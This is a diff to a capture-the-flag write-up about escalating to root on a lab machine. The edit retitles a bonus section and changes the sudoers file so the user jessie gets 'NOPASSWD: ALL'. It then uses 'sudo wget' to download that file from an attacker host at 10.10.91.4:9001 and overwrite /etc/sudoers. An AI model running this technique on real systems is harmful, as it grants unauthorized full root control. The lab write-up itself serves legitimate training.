@@ -206,7 +206,7 @@ Content-Length: 33
 flag:xxxxxxxxxxxxxxxxxxx
 ```
 
-## Bonus Attempts (Failed)
+## Bonus Attempts to Gain Root Shell
 
 12. But where is the fun without gaining proper root access to the machine? Lets attempt that.
 - Listen to the port as 9001 but now we will get ```/etc/sudoers``` instead
@@ -260,7 +260,11 @@ root    ALL=(ALL:ALL) ALL
 jessie  ALL=(root) NOPASSWD: /usr/bin/wget
 ```
 
-- Save this file and change ```/usr/bin/wget``` to ```ALL```
+- Save this file and change:
+```
+#includedir /etc/sudoers.d
+jessie  ALL=(ALL) NOPASSWD: ALL
+```
 
 - After saving it we will ```wget``` and replace ```sudoers```
 ```bash
@@ -268,8 +272,7 @@ jessie  ALL=(root) NOPASSWD: /usr/bin/wget
 cd /etc
 
 #wget and replace
-/usr/bin/wget 10.10.91.4:9001/badsudo --output-document=sudoers
-sudoers: Permission denied
+sudo /usr/bin/wget 10.10.91.4:9001/badsudo --output-document=sudoers
 ```
 
 
